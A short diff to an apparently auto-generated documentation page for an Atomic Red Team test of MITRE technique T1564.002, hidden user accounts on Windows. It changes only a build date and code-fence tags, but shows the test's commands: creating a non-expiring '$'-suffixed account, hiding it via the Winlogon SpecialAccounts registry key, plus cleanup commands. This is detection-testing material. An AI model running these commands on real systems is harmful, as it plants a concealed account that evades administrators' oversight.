@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1564.002"
 attack_technique_name: "Hide Artifacts: Hidden Users"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.002/T1564.002.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "173126b7-afe4-45eb-8680-fa9f6400431c"
@@ -59,14 +59,14 @@ Reference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirrepo
 
 ### Command
 
-```commandprompt
+```cmd
 NET USER #{user_name}$ #{user_password} /ADD /expires:never 
 REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v #{user_name}$ /t REG_DWORD /d 0
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v #{user_name}$ /f >nul 2>&1
 net user ${user_name}$ /delete >nul 2>&1
 ```
